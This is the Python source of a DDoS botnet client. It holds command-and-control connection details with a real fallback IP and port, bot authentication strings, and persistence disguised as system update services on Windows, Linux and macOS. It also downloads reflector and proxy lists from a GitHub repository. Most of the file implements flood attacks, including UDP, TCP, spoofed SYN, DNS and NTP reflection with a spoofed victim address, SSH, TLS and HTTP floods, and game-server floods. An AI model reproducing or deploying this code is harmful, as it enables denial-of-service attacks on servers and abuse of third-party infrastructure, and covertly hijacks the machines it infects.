#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Standard Imports
import socket
import threading
import time
import random
import os
import sys
import struct
import platform
import subprocess
import re # Used for cleaning user agents
import json # For potential future config or structured data
from struct import pack as data_pack
# from multiprocessing import Process # httpio removed, so Process might not be needed. Keeping import check just in case.
try:
    from multiprocessing import Process
    PROCESS_AVAILABLE = True
except ImportError:
    PROCESS_AVAILABLE = False
    def Process(*args, **kwargs): pass # Placeholder

from urllib.parse import urlparse # Used for URL parsing in HTTP methods
import math # Added for calculating worker counts
import traceback # Added for detailed error logging
# Added urllib.request for fallback file download
import urllib.request

# --- Conditional Imports & Dependency Checks ---

# Scapy imports - requires root/Administrator on many systems and 'pip install scapy'
SCAPY_AVAILABLE = False
try:
    from scapy.all import IP, UDP, Raw, send as scapy_send, TCP
    from scapy.layers.dns import DNS, DNSQR # Added for DNS attacks
    SCAPY_AVAILABLE = True
except ImportError:
    print("Warning: Scapy not installed or import failed. DNS, SYN attacks may not work.")
    def scapy_send(*args, **kwargs): pass
    IP = None; UDP = None; Raw = None; TCP = None; DNS = None; DNSQR = None

# icmplib import - requires 'pip install icmplib' (Kept just in case, though not directly used by new methods)
ICMPLIB_AVAILABLE = False
try:
    from icmplib import ping as pig
    ICMPLIB_AVAILABLE = True
except ImportError:
    def pig(*args, **kwargs): pass


# HTTP/Proxy imports - requires 'pip install requests cloudscraper PySocks'
REQUESTS_AVAILABLE = False
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    print("Warning: requests not installed. HTTP attacks may not work.")
    requests = None

CLOUDSCRAPER_AVAILABLE = False
if REQUESTS_AVAILABLE:
    try:
        import cloudscraper
        CLOUDSCRAPER_AVAILABLE = True
    except ImportError:
        print("Warning: cloudscraper not installed. HTTP attacks may not work efficiently.")
        cloudscraper = None
else:
     cloudscraper = None

# PySocks import - requires 'pip install PySocks'
SOCKS_AVAILABLE = False
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    print("Warning: PySocks not installed. HTTPPROXY attack may not work with SOCKS proxies.")
    socks = None

SSL_AVAILABLE = False
try:
    import ssl
    SSL_AVAILABLE = True
except ImportError:
    print("Warning: ssl module not available. TLS attacks may not work.")
    ssl = None


# Persistence imports (Windows specific) - requires 'pip install pywin32'
SYSTEM_INFO = platform.system().lower()
WINREG_AVAILABLE = False
if SYSTEM_INFO == 'windows':
    try:
        import winreg
        WINREG_AVAILABLE = True
    except ImportError:
        print("Warning: pywin32 not installed. Windows persistence may not work.")
else:
    WINREG_AVAILABLE = False

# --- CNC Connection Details ---
VERCEL_IP_FETCH_URL = "https://ipport.vercel.app/ip?key=2504"
VERCEL_PORT_FETCH_URL = "https://ipport.vercel.app/port?key=2504"
FALLBACK_C2_ADDRESS = "51.38.140.80" # <-- **REPLACE THIS**
FALLBACK_C2_PORT = 5511            # <-- **REPLACE THIS**

VERCEL_C2_ADDRESS = None
VERCEL_C2_PORT = None
USE_VERCEL = True
LAST_VERCEL_CHECK_TIME = 0
VERCEL_CHECK_INTERVAL = 600

# --- Bot Authentication Details ---
BOT_AUTH_STRING = b'6697877617368657266900'
EXPECTED_BOT_USERNAME = b'BOT'
EXPECTED_BOT_PASSWORD = b'\xff\xff\xff\xff='

# --- Global Variables ---
cnc_socket = None
attack_threads = []
external_lists = {
    'ntp_servers': [],
    'dns_resolvers': [],
    'socks_proxies': [],
    'http_proxies': []
}
active_attacks_count = 0
start_time = time.time()

switch_connection_event = threading.Event()

FIXED_THREAD_COUNT = 80
DEFAULT_PACKET_SIZE = 1400
LARGE_PACKET_SIZE = 60000


# --- Helper Functions ---

base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/99.0.1150.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 12; Mobile; rv:100.0) Gecko/100.0 Firefox/100.0'
]

def rand_ua():
    """Generates a random user agent string."""
    chosen_user_agent = random.choice(base_user_agents)
    try:
        formatted_ua = re.sub(r'%\.[0-9]f', lambda x: str(round(random.uniform(1, 100), int(x.group(0)[2]))), chosen_user_agent)
        formatted_ua = re.sub(r'%d', lambda x: str(random.randint(1, 99999)), formatted_ua)
        formatted_ua = formatted_ua.format(random.uniform(5.0, 10.0), random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), random.random() + random.randint(3, 9), random.random())
        return formatted_ua
    except Exception:
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'

def has_root():
    """Checks if the script is running with root/Administrator privileges."""
    if SYSTEM_INFO == 'windows':
        try:
            if WINREG_AVAILABLE:
                 import ctypes
                 try:
                      return ctypes.windll.shell32.IsUserAnAdmin() != 0
                 except Exception:
                      pass
            try:
                 with open("C:\\Windows\\System32\\drivers\\etc\\test_admin.txt", "w") as f:
                      f.write("test")
                 os.remove("C:\\Windows\\System32\\drivers\\etc\\test_admin.txt")
                 return True
            except Exception:
                 return False
        except Exception:
             return False
    elif SYSTEM_INFO == 'linux' or SYSTEM_INFO == 'darwin':
        return os.geteuid() == 0
    return False

def detect_system():
    """Detect the system architecture and OS."""
    system_info = {
        'os': SYSTEM_INFO,
        'architecture': platform.machine().lower(),
        'distro': '',
        'is_iot': False,
        'has_root': has_root()
    }

    iot_arches = ['mips', 'arm', 'aarch64', 'riscv']
    if any(arch in system_info['architecture'] for arch in iot_arches):
        system_info['is_iot'] = True

    if system_info['os'] == 'linux':
        try:
            if os.path.exists('/etc/os-release'):
                 with open('/etc/os-release') as f:
                    for line in f:
                        if line.startswith('ID='):
                            system_info['distro'] = line.split('=')[1].strip().strip('"')
                            break
            elif os.path.exists('/etc/lsb-release'):
                 with open('/etc/lsb-release') as f:
                     for line in f:
                         if line.startswith('DISTRIB_ID='):
                             system_info['distro'] = line.split('=')[1].strip()
                             break
        except Exception:
            pass

    return system_info

def add_persistence(system_info):
    """Add persistence mechanism based on the detected system."""
    try:
        current_script_path = os.path.abspath(__file__)
        if system_info['os'] == 'windows' and WINREG_AVAILABLE:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                reg_exists = False
                try:
                     with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as reg_key_read:
                         value, reg_type = winreg.QueryValueEx(reg_key_read, "SystemUpdater")
                         if value and isinstance(value, str) and value.strip('"').lower() == current_script_path.lower():
                              reg_exists = True
                except FileNotFoundError:
                    pass
                except Exception:
                    pass

                if not reg_exists:
                     with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg_key:
                         reg_value = f'"{sys.executable}" "{current_script_path}"'
                         winreg.SetValueEx(reg_key, "SystemUpdater", 0, winreg.REG_SZ, reg_value)
                         print("Windows persistence added to HKCU Run key.")
            except Exception as e:
                 print(f"Warning: Windows persistence failed (HKCU): {e}. Trying HKLM (requires admin)...")
                 key_hklm = winreg.HKEY_LOCAL_MACHINE
                 subkey_hklm = r"Software\Microsoft\Windows\CurrentVersion\Run"
                 try:
                     reg_exists_hklm = False
                     try:
                          with winreg.OpenKey(key_hklm, subkey_hklm, 0, winreg.KEY_READ) as reg_key_read_hklm:
                              value_hklm, reg_type_hklm = winreg.QueryValueEx(reg_key_read_hklm, "SystemUpdater")
                              if value_hklm and isinstance(value_hklm, str) and value_hklm.strip('"').lower() == current_script_path.lower():
                                   reg_exists_hklm = True
                     except FileNotFoundError:
                         pass
                     except Exception:
                         pass

                     if not reg_exists_hklm:
                          with winreg.OpenKey(key_hklm, subkey_hklm, 0, winreg.KEY_WRITE) as reg_key_hklm:
                              reg_value = f'"{sys.executable}" "{current_script_path}"'
                              winreg.SetValueEx(reg_key_hklm, "SystemUpdater", 0, winreg.REG_SZ, reg_value)
                              print("Windows persistence added to HKLM Run key (requires admin).")
                 except Exception as e_hklm:
                      print(f"Warning: Windows persistence failed (HKLM, requires admin): {e_hklm}")

        elif system_info['os'] == 'linux':
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {current_script_path}
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""
            service_path = '/etc/systemd/system/system-update.service'
            try:
                service_correct = False
                if os.path.exists(service_path):
                     with open(service_path, 'r') as f:
                         if f"ExecStart={sys.executable} {current_script_path}" in f.read():
                             service_correct = True

                if not service_correct:
                    with open(service_path, 'w') as f:
                        f.write(service_content)
                    subprocess.run(['systemctl', 'daemon-reload'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    subprocess.run(['systemctl', 'enable', 'system-update.service'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    subprocess.run(['systemctl', 'start', 'system-update.service'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    print("Linux (Systemd) persistence added and started (requires root).")
            except Exception as e:
                 print(f"Warning: Linux (Systemd) persistence failed (requires root?): {e}. Trying Cron...")
                 if system_info['is_iot']:
                      cron_file = '/etc/crontab'
                 else:
                      cron_file = None
                 cron_line = f"@reboot {sys.executable} {current_script_path} >/dev/null 2>&1 &\n"

                 if cron_file == '/etc/crontab':
                      try:
                          cron_exists = False
                          if os.path.exists(cron_file):
                              with open(cron_file, 'r') as f:
                                  if cron_line in f.read():
                                       cron_exists = True
                          if not cron_exists:
                              with open(cron_file, 'a') as f:
                                  f.write(cron_line)
                              print(f"Linux Cron persistence added to {cron_file} (requires root).")
                      except Exception as e_cron:
                           print(f"Warning: Linux Cron persistence failed ({cron_file}): {e_cron}")
                 else:
                      try:
                           result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, check=False)
                           existing_crontab = result.stdout if result.returncode == 0 else ""
                           if cron_line not in existing_crontab:
                                new_crontab = existing_crontab + cron_line
                                process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                                stdout, stderr = process.communicate(input=new_crontab.encode('utf-8'))
                                if process.returncode == 0:
                                     print("Linux user crontab persistence added.")
                                else:
                                     print(f"Warning: Linux user crontab persistence failed: {stderr.decode('utf-8', errors='ignore').strip()}")
                      except FileNotFoundError:
                           print("Warning: 'crontab' command not found for user crontab persistence.")
                      except Exception as e_user_cron:
                           print(f"Warning: Linux user crontab persistence failed: {e_user_cron}")

        elif system_info['os'] == 'darwin':
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{current_script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
"""
            plist_dir = os.path.expanduser('~/Library/LaunchAgents')
            plist_path = os.path.join(plist_dir, 'com.apple.systemupdate.plist')

            try:
                os.makedirs(plist_dir, exist_ok=True)
                plist_correct = False
                if os.path.exists(plist_path):
                     import plistlib
                     try:
                         with open(plist_path, 'rb') as f:
                             existing_plist = plistlib.load(f)
                             if existing_plist.get('ProgramArguments') == [sys.executable, current_script_path] and existing_plist.get('Label') == 'com.apple.systemupdate':
                                  plist_correct = True
                     except Exception: pass

                if not plist_correct:
                    with open(plist_path, 'w') as f:
                        f.write(plist_content)
                    subprocess.run(['launchctl', 'load', '-w', plist_path], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    print("macOS launchd persistence added and loaded.")
            except Exception as e:
                 print(f"Warning: macOS launchd persistence failed: {e}")

    except Exception as e:
        print(f"Warning: General persistence setup failed: {e}")


def spoofer():
    """Generates a random looking IP address (not guaranteeing valid/usable)."""
    parts = [str(random.randrange(1, 255)) for _ in range(4)]
    return '.'.join(parts)

def remove_by_value(arr, val):
    """Removes all occurrences of a value from a list."""
    return [item for item in arr if item != val]

# Added helper function to download a single file
def _download_file_from_url(url, dest_path):
    """Attempts to download a file from a URL using requests or urllib."""
    print(f"Attempting to download {url} to {dest_path}...")
    try:
        if REQUESTS_AVAILABLE:
            # Use requests if available (handles redirects, better error handling)
            response = requests.get(url, timeout=10, stream=True)
            response.raise_for_status() # Raise an exception for bad status codes
            with open(dest_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            print(f"Downloaded successfully using requests.")
            return True
        else:
            # Fallback to urllib.request
            # Note: urllib.request is less robust, might not handle redirects, requires HTTPS certs unless ignored globally.
            # We won't ignore certs globally here.
            urllib.request.urlretrieve(url, dest_path)
            print(f"Downloaded successfully using urllib.request.")
            return True
    except requests.exceptions.RequestException as e:
        print(f"Download failed using requests: {e}")
        return False
    except Exception as e: # Catch urllib errors or other exceptions
        print(f"Download failed using urllib.request: {e}")
        return False


def load_external_lists():
    """Loads server and proxy lists from files or downloads them."""
    global external_lists

    # Define list files and their potential download URLs
    list_configs = {
        'ntp_servers': {'filename': 'ntpServers.txt', 'url': 'https://raw.githubusercontent.com/umbx-dot/secs/refs/heads/main/ntpServers.txt'},
        'dns_resolvers': {'filename': 'dns_resolvers.txt', 'url': 'https://raw.githubusercontent.com/umbx-dot/secs/refs/heads/main/dns_resolvers.txt'},
        'socks_proxies': {'filename': 'socks4.txt', 'url': 'https://raw.githubusercontent.com/umbx-dot/secs/refs/heads/main/socks4.txt'}, # Assuming this file might contain socks proxies
        'http_proxies': {'filename': 'http_proxies.txt', 'url': 'https://raw.githubusercontent.com/umbx-dot/secs/refs/heads/main/http_proxies.txt'},
        'memsv': {'filename': 'memsv.txt', 'url': 'https://raw.githubusercontent.com/umbx-dot/secs/refs/heads/main/memsv.txt'} # Included memsv.txt as requested, though not used by current methods
    }

    script_dir = os.path.dirname(os.path.abspath(__file__))

    for key, config in list_configs.items():
        filename = config['filename']
        url = config['url']
        filepath = os.path.join(script_dir, filename)
        items = []

        if os.path.exists(filepath):
            # Load from local file if it exists
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    items = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                print(f"Loaded {len(items)} items from local '{filename}'.")
            except Exception as e:
                print(f"Error loading local list file '{filename}': {e}. Attempting download...")
                items = [] # Clear items on load error
        else:
            print(f"Local list file '{filename}' not found. Attempting download...")

        # If items are empty (file not found or failed to load), try downloading
        if not items:
            if _download_file_from_url(url, filepath):
                # If download was successful, try loading the file again
                try:
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                         items = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    print(f"Loaded {len(items)} items from downloaded '{filename}'.")
                except Exception as e:
                    print(f"Error loading downloaded list file '{filename}': {e}.")
                    items = [] # Ensure empty list on error loading downloaded file
            else:
                 print(f"Warning: Failed to download '{filename}'. Continuing without this list.")
                 # Ensure the file exists even if download fails to avoid repeated download attempts
                 try:
                      with open(filepath, 'w', encoding='utf-8') as f: pass # Create empty file
                      print(f"Created empty placeholder for '{filename}'.")
                 except Exception: pass


        external_lists[key] = items # Assign the loaded (or empty) list


# --- Worker Thread for Attack Loop ---
def _attack_worker(attack_core_logic, end_time, *args):
    """Worker thread executing the core attack logic in a loop."""
    while time.time() < end_time:
        try:
            attack_core_logic(*args)
        except Exception:
            pass

# --- Attack Method Implementations (Spawning Fixed Threads) ---

def udp_method(ip, port, timer, packet_size, root_status):
    end_time = time.time() + int(timer)
    target_port = int(port) if int(port) != 0 else random.randint(1, 65535)
    final_packet_size = int(packet_size)

    size_to_use = DEFAULT_PACKET_SIZE
    if final_packet_size > DEFAULT_PACKET_SIZE and root_status:
        size_to_use = min(final_packet_size, LARGE_PACKET_SIZE)
        print(f"UDP attack: Bot has root, using requested large size {size_to_use}.")
    else:
        print(f"UDP attack: Bot not root or large size not requested, using default size {size_to_use}.")

    print(f"Starting UDP attack on {ip}:{target_port} for {timer} seconds with size {size_to_use} across {FIXED_THREAD_COUNT} threads...")

    def send_udp_packet(ip, port, size):
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(size)
            s.sendto(data, (ip, port))
        except Exception:
            pass
        finally:
            if s: s.close()

    worker_threads = []
    for i in range(FIXED_THREAD_COUNT):
        thread = threading.Thread(target=_attack_worker,
                                  args=(send_udp_packet, end_time, ip, target_port, size_to_use),
                                  daemon=True)
        worker_threads.append(thread)
        thread.start()


def tcp_method(ip, port, timer, packet_size):
    end_time = time.time() + int(timer)
    target_port = int(port)
    size_to_use = DEFAULT_PACKET_SIZE
    print(f"Starting TCP attack on {ip}:{target_port} for {timer} seconds with size {size_to_use} across {FIXED_THREAD_COUNT} threads...")

    def send_tcp_data(ip, port, size):
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            s.settimeout(None)
            data = os.urandom(size)
            s.sendall(data)
        except (socket.error, socket.timeout):
            pass
        except Exception:
            pass
        finally:
            if s:
                try: s.close()
                except: pass

    worker_threads = []
    for i in range(FIXED_THREAD_COUNT):
        thread = threading.Thread(target=_attack_worker,
                                  args=(send_tcp_data, end_time, ip, target_port, size_to_use),
                                  daemon=True)
        worker_threads.append(thread)
        thread.start()

def syn_method(ip, port, timer, scapy_available):
    if not scapy_available:
        print("SYN attack requires Scapy.")
        return
    if not has_root():
         print("SYN attack (spoofing) requires root privileges. Attack may fail.")

    end_time = time.time() + int(timer)
    target_port = int(port)
    print(f"Starting SYN attack on {ip}:{target_port} for {timer} seconds across {FIXED_THREAD_COUNT} threads...")

    def send_syn_packet(ip, port):
        try:
            src_ip = spoofer()
            src_port = random.randint(1024, 65535)
            ip_layer = IP(src=src_ip, dst=ip)
            tcp_layer = TCP(sport=src_port, dport=port, flags="S")
            packet = ip_layer / tcp_layer
            scapy_send(packet, count=1, verbose=False)
        except Exception:
            pass

    worker_threads = []
    for i in range(FIXED_THREAD_COUNT):
        thread = threading.Thread(target=_attack_worker,
                                  args=(send_syn_packet, end_time, ip, target_port),
                                  daemon=True)
        worker_threads.append(thread)
        thread.start()


# New L4 Methods

def dns_method(dns_server_ip, target_ip, timer, scapy_available):
    if not scapy_available:
        print("DNS attack requires Scapy.")
        return
    if not has_root():
         print("DNS attack (spoofing) requires root privileges. Attack may fail.")
    if not external_lists['dns_resolvers']:
         print("DNS attack requires a list of DNS resolvers (dns_resolvers.txt).")
         return

    end_time = time.time() + int(timer)
    resolvers_to_use = external_lists['dns_resolvers']
    if dns_server_ip and re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", dns_server_ip):
         resolvers_to_use = [dns_server_ip] + external_lists['dns_resolvers']
         resolvers_to_use = list(dict.fromkeys(resolvers_to_use))

    if not resolvers_to_use:
         print("No valid DNS resolvers available.")
         return

    print(f"Starting DNS attack via resolvers on {target_ip} for {timer} seconds across {FIXED_THREAD_COUNT} threads...")

    def send_dns_query(target_ip, resolvers):
        try:
            resolver = random.choice(resolvers)
            query_name = f"{os.urandom(8).hex()}.example.com"
            qd = DNSQR(qname=query_name, qtype='A', qclass='IN')

            dns_packet = IP(src=target_ip, dst=resolver) / UDP(sport=random.randint(1024, 65535), dport=53) / DNS(id=random.randint(1, 65535), rd=1, qd=qd)

            scapy_send(dns_packet, count=1, verbose=False)
        except Exception:
            pass

    worker_threads = []
    for i in range(FIXED_THREAD_COUNT):
        thread = threading.Thread(target=_attack_worker,
                                  args=(send_dns_query, end_time, target_ip, resolvers_to_use),
                                  daemon=True)
        worker_threads.append(thread)
        thread.start()


def ssh_spam_method(ip, timer, size):
    end_time = time.time() + int(timer)
    target_port = 22
    size_to_use = DEFAULT_PACKET_SIZE
    print(f"Starting SSH-SPAM attack on {ip}:{target_port} for {timer} seconds with size {size_to_use} across {FIXED_THREAD_COUNT} threads...")

    def send_ssh_spam(ip, port, size):
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            s.settimeout(None)
            s.sendall(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n")
            data = os.urandom(size)
            s.sendall(data)
        except (socket.error, socket.timeout):
            pass
        except Exception:
             pass
        finally:
            if s:
                try: s.close()
                except: pass

    worker_threads = []
    for i in range(FIXED_THREAD_COUNT):
        thread = threading.Thread(target=_attack_worker,
                                  args=(send_ssh_spam, end_time, ip, target_port, size_to_use),
                                  daemon=True)
        worker_threads.append(thread)
        thread.start()


# L7 Attack Methods

def tls_method(target, timer, ssl_available, requests_available):
    if not ssl_available and not requests_available:
        print("TLS attack requires ssl or requests.")
        return

    end_time = time.time() + int(timer)

    parsed_url = urlparse(target)
    target_host = parsed_url.hostname or target
    target_port = parsed_url.port or 443

    print(f"Starting TLS handshake attack on {target_host}:{target_port} for {timer} seconds across {FIXED_THREAD_COUNT} threads...")

    use_session = requests_available

    def perform_tls_handshake(host, port, use_session):
        if use_session:
             session = requests.Session()
             try:
                 response = session.head(f"https://{host}:{port}/", timeout=5, verify=False)
             except requests.RequestException:
                 pass
             finally:
                 session.close()
        elif ssl_available:
             sock = None
             ssl_sock = None
             try:
                 sock = socket.create_connection((host, port), timeout=5)
                 context = ssl.create_default_context()
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 ssl_sock = context.wrap_socket(sock, server_hostname=host)
                 ssl_sock.sendall(b"HEAD / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
             except (socket.error, socket.timeout, ssl.SSLError):
                 pass
             except Exception:
                 pass
             finally:
                 if ssl_sock:
                     try: ssl_sock.close()
                     except: pass
                 if sock:
                     try: sock.close()
                     except: pass

    worker_threads = []
    for i in range(FIXED_THREAD_COUNT):
        thread = threading.Thread(target=_attack_worker,
                                  args=(perform_tls_handshake, end_time, target_host, target_port, use_session),
                                  daemon=True)
        worker_threads.append(thread)
        thread.start()


def httpproxy_method(url, timer, http_proxies, requests_available):
    if not requests_available:
        print("HTTPPROXY attack requires requests.")
        return
    if not http_proxies:
        print("HTTPPROXY attack requires a list of HTTP proxies (http_proxies.txt).")
        return

    end_time = time.time() + int(timer)

    if not urlparse(url).scheme:
        url = "http://" + url

    print(f"Starting HTTPPROXY attack on {url} for {timer} seconds using {len(http_proxies)} proxies across {FIXED_THREAD_COUNT} threads...")

    def send_proxy_request(target_url, proxies_list):
        session = requests.Session()
        try:
            proxy = random.choice(proxies_list)
            proxy_scheme = 'https' if proxy.startswith('https://') else 'http'
            proxy_address = proxy.split('://')[-1]

            proxy_dict = {proxy_scheme: f'{proxy_scheme}://{proxy_address}'}
            session.proxies = proxy_dict
            headers = {'User-Agent': rand_ua()}
            session.get(target_url, headers=headers, timeout=10)
        except requests.RequestException:
            pass
        except Exception:
             pass
        finally:
             session.close()

    worker_threads = []
    proxies_copy = list(http_proxies)
    for i in range(FIXED_THREAD_COUNT):
        thread = threading.Thread(target=_attack_worker,
                                  args=(send_proxy_request, end_time, url, proxies_copy),
                                  daemon=True)
        worker_threads.append(thread)
        thread.start()

# Game Attack Methods

def udpgame_method(ip, port, timer, size):
    end_time = time.time() + int(timer)
    target_port = int(port)
    size_to_use = DEFAULT_PACKET_SIZE
    print(f"Starting UDPGAME attack on {ip}:{target_port} for {timer} seconds with size {size_to_use} across {FIXED_THREAD_COUNT} threads...")

    def send_udp_game_packet(ip, port, size):
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(size)
            s.sendto(data, (ip, port))
        except Exception:
            pass
        finally:
            if s: s.close()

    worker_threads = []
    for i in range(FIXED_THREAD_COUNT):
        thread = threading.Thread(target=_attack_worker,
                                  args=(send_udp_game_packet, end_time, ip, target_port, size_to_use),
                                  daemon=True)
        worker_threads.append(thread)
        thread.start()


def mc_method(ip, timer, size):
    end_time = time.time() + int(timer)
    target_port = 25565
    size_to_use = DEFAULT_PACKET_SIZE
    print(f"Starting MC attack on {ip}:{target_port} for {timer} seconds with size {size_to_use} across {FIXED_THREAD_COUNT} threads...")

    def send_mc_packet(ip, port, size):
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(size)
            s.sendto(data, (ip, port))
        except Exception:
            pass
        finally:
            if s: s.close()

    worker_threads = []
    for i in range(FIXED_THREAD_COUNT):
        thread = threading.Thread(target=_attack_worker,
                                  args=(send_mc_packet, end_time, ip, target_port, size_to_use),
                                  daemon=True)
        worker_threads.append(thread)
        thread.start()

def httpget_method(url, port, secs, cloudscraper_available, requests_available):
    if not requests_available:
        print("HTTPGET attack requires requests.")
        return

    end_time = time.time() + int(secs)

    if not urlparse(url).scheme:
        url = "http://" + url

    parsed_url = urlparse(url)
    final_url = url
    if port and port != 0:
         try:
              specified_port = int(port)
              default_port_for_scheme = 80 if parsed_url.scheme == 'http' else (443 if parsed_url.scheme == 'https' else None)
              if specified_port != default_port_for_scheme:
                   netloc_parts = parsed_url.netloc.split(':')
                   host_part = netloc_parts[0]
                   final_url = f"{parsed_url.scheme}://{host_part}:{specified_port}{parsed_url.path}{';' + parsed_url.params if parsed_url.params else ''}{'?' + parsed_url.query if parsed_url.query else ''}{'#' + parsed_url.fragment if parsed_url.fragment else ''}"
         except ValueError:
              print(f"Warning: Invalid port '{port}' specified for HTTPGET. Using default port for scheme.")
         except Exception as e:
              print(f"Warning: Error processing port for HTTPGET: {e}. Using original URL.")


    print(f"Starting HTTPGET attack on {final_url} for {secs} seconds across {FIXED_THREAD_COUNT} threads...")

    use_scraper = cloudscraper_available and requests_available
    if use_scraper:
         scraper = cloudscraper.create_scraper(sess=requests.Session())
    else:
         session = requests.Session()

    def send_httpget_request(target_url, use_scraper, scraper=None, session=None):
        try:
            headers = {'User-Agent': rand_ua()}
            timeout = 15

            if use_scraper and scraper:
                 scraper.get(target_url, headers=headers, timeout=timeout)
            elif session:
                 session.get(target_url, headers=headers, timeout=timeout)
        except requests.RequestException:
            pass

    worker_threads = []
    for i in range(FIXED_THREAD_COUNT):
        thread = threading.Thread(target=_attack_worker,
                                  args=(send_httpget_request, end_time, final_url, use_scraper, scraper if use_scraper else None, session if not use_scraper else None),
                                  daemon=True)
        worker_threads.append(thread)
        thread.start()


def ntp_method(target_src_ip, port, timer, ntp_servers, scapy_available):
    if not scapy_available:
        print("NTP attack requires Scapy.")
        return
    if not has_root():
         print("NTP attack (spoofing) requires root privileges. Attack may fail.")
    if not ntp_servers:
        print("NTP attack requires a list of NTP servers (ntpServers.txt).")
        return

    end_time = time.time() + int(timer)
    ntp_payload = b"\x17\x00\x03\x2a" + b"\x00" * 4
    target_port = int(port) if int(port) != 0 else random.randint(1, 65535)

    print(f"Starting NTP attack with spoofed source {target_src_ip} for {timer} seconds across {FIXED_THREAD_COUNT} threads...")

    def send_ntp_packet(target_src_ip, port, ntp_servers, ntp_payload):
        try:
            server = random.choice(ntp_servers)
            packet = IP(dst=server, src=target_src_ip) / UDP(sport=random.randint(1024, 65535), dport=123) / Raw(load=ntp_payload)
            scapy_send(packet, count=1, verbose=False)
        except Exception:
            pass

    worker_threads = []
    for i in range(FIXED_THREAD_COUNT):
        thread = threading.Thread(target=_attack_worker,
                                  args=(send_ntp_packet, end_time, target_src_ip, target_port, ntp_servers, ntp_payload),
                                  daemon=True)
        worker_threads.append(thread)
        thread.start()


# --- Attack Method Wrapper ---
def _attack_thread_wrapper(attack_func, *args):
    """Wrapper to handle attack count and exception logging for a single command dispatch."""
    global active_attacks_count
    thread_name = threading.current_thread().name
    print(f"[{thread_name}] Command dispatched.")
    active_attacks_count += 1
    try:
        attack_func(*args)

        attack_duration = 0
        for arg in args:
             if isinstance(arg, int) and arg >= 10 and arg <= 1300:
                  attack_duration = arg
                  break

        if attack_duration > 0:
             time.sleep(attack_duration)
        else:
             print(f"[{thread_name}] Could not reliably determine attack duration from args ({args}). Wrapper thread exiting early.")


    except Exception as e:
        print(f"[{thread_name}] Error during attack dispatch or duration wait: {e}")
        import traceback
        traceback.print_exc()
    finally:
        active_attacks_count -= 1
